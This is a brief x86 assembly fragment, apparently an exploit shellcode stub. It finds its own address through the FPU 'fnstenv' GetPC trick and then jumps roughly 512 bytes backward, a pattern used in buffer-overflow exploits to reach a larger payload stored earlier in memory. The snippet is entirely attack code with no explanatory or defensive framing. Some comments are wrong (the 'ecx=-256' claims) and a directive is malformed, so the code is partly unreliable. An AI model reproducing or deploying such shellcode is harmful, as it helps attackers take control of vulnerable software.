[BITS 32]

global_start
 _start:

# ;--- copy eip into ecx
fldz
fnstenv [esp-12]
pop ecx
add cl, 10
nop
# ; -----------
dec ch 	; ecx=-256;
dec ch	; ecx=-256;
jmp ecx	; lets jmp ecx (current location - 512)
